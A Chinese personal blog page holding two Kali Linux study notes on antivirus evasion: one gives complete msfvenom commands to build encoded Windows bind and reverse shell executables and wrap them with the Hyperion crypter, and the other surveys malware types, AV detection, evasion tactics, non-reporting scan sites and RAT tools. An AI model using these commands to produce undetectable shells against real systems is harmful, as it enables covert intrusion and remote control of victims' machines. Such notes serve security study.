    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/" itemprop="url">Kali Linux笔记(八十九)：免杀技术--crypter加密</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T19:55:34+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  418 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-msfvenom–加密shell"><a href="#1-msfvenom–加密shell" class="headerlink" title="1. msfvenom–加密shell"></a>1. msfvenom–加密shell</h4><ul>
<li>msfvenom参数<ul>
<li>-p（使用的payload）</li>
<li>-a（目标机器的架构）</li>
<li>–platform（目标机器的平台）</li>
<li>-f（生成的文件file）</li>
<li>-o（输出的文件）</li>
<li>-f（原文件格式，可通过管道）</li>
<li>-e（echo加密编码）</li>
<li>-i（加密的次数，跟-e一起使用）</li>
<li>-b（特殊字符的过来）</li>
</ul>
</li>
<li>strings → 查看文件中可读字符串  md5sum → 文件的md5值</li>
<li>生成反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_crypt_a.exe</code></strong></li>
</ul>
</li>
<li>加密编码反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o msfvenom_crypt_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=8f0a1L_0As6Rho8dCl4UUhyCmqiHqovU3g8Jhd-ON4QtEATGbXAQ5cKA0yi8ZA4fTsdKrGvGcnYyaI9cXNu2UMIxMvOodTNP2hKU4OV_pH8gqeQAZlVxuG6PMtyarIlC6w&file_name=/msfvenom_crypt_a.PNG" alt="msfvenom_crypt_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=6cd2aOzy5MKuuA0pY73udUOCHBetewBeXijmZea0d-Se5oacdk_3Nm6KhwZUwEK2MJ2ZRAbm0DsXRKv9-njd6hQ0kpMNksZp6FyuHffV1_ciPbTiU2EkXqNf4fO4tNaJ1A&file_name=/msfvenom_crypt_b.PNG" alt="msfvenom_crypt_b.exe"></p>
<h4 id="2-Hyperion–软件保护"><a href="#2-Hyperion–软件保护" class="headerlink" title="2. Hyperion–软件保护"></a>2. Hyperion–软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion（32bit PE程序加密器）<ul>
<li>window平台上的加密器</li>
<li>Crypter / Container（解密器+PE Loader）</li>
<li>默认路径：/usr/share/windows-binaries/</li>
<li><a href="https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip" target="_blank" rel="noopener">https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</a> </li>
<li><strong><code>🔺命令：unzip Hyperion-1.2.zip</code></strong> </li>
<li><strong><code>🔺命令：cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</code></strong> </li>
<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o msfvenom_hyperion_a.exe</code></strong> </li>
<li><strong><code>🔺命令：wine h.exe msfvenom_hyperion_a.exe msfvenom_hyperion_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell类似的免杀效果（查杀网站）</li>
<li>▲ 2020.2.13Hyperion2.2版本在Linux上的编译无法完成</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=fd7fcm5altn_ywl6IaSFu-cEmdTZxX2GyJoYoFz5nMXEYMVEAEBqXfRVglRb_D2UTQ7bVQbRYhC5-akLtiF7J5q6AghORRd75nK8SwJU3ne1DYvqY_hdr_4l1b7MGqfXdMPCQw&file_name=/msfvenom_hyperion_a.PNG" alt="msfvenom_hyperion_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=b04dEruGxgUTqqkEauX-ErRpeocbjwYTIOL7qOfv5xL8gVOYsy9n-4G1ofw_jPZqtsQFpKfNIcvJ_sHvMjjV-aCKTfRJzrc6yhboOqpA9UjNF31MNyhgpTD4yCA-JZ3xXvV-JQ&file_name=/msfvenom_hyperion_b.PNG" alt="msfvenom_hyperion_b.exe"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/" itemprop="url">Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T16:18:23+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  590 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1. 恶意软件"></a>1. 恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装</li>
<li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2. 防病毒软件"></a>2. 防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法（病毒特征库）</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3. 免杀技术"></a>3. 免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密使得特征字符不可读，从而逃避AV检测</li>
<li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器crypter的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4. 当前现状"></a>4. 当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有RAT软件，避免普遍被AV所知的特征字符</li>
<li>使用独有crypter软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable是最高追求（FUD）</li>
</ul>
</li>
<li>AV厂商<ul>
<li>广泛采集样本，尽快发现新出现的恶意程序，更新病毒库</li>
<li>一般新的恶意软件安全UD窗口期是一周左右</li>
<li>与恶意软件制造者永无休止的拉锯战</li>
<li>新的启发式检测技术尚有待完善（误杀露杀）</li>
</ul>
</li>
<li>单一AV厂商的病毒库很难达到100%覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.viruscan.org/" target="_blank" rel="noopener">http://www.viruscan.org/</a> ▲ 2020.2.13此网站不可用</li>
<li>在线多引擎查杀网站与AV厂商共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check" target="_blank" rel="noopener">http://viruscheckmate.com/check</a> ▲ 2020.2.13此网站不可用</li>
</ul>
</li>
</ul>
</li>
<li>常用RAT软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
<li>▲ 下载测试几款RAT软件</li>
<li>▲ 2020.2.13已下载到灰鸽子、NanoCore</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">104</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">99.7k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
